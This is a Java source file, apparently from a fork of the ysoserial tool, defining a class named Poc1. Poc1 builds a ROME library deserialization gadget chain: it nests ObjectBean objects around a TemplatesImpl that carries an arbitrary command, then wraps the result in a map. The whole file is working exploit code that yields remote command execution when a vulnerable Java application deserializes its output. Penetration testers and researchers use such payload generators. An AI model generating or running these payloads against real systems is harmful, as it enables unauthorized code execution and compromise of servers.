package ysoserial.payloads.tabbyGadgetChains.rome;

import com.sun.syndication.feed.impl.ObjectBean;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Field;

public class Poc1 implements ObjectPayload<Object> {

    public Object getObject ( String command ) throws Exception {
        Object o = Gadgets.createTemplatesImpl(command);
        ObjectBean delegate = new ObjectBean(Templates.class, o);
        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
        return Gadgets.makeMap(root, root);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(Poc1.class, args);
    }

}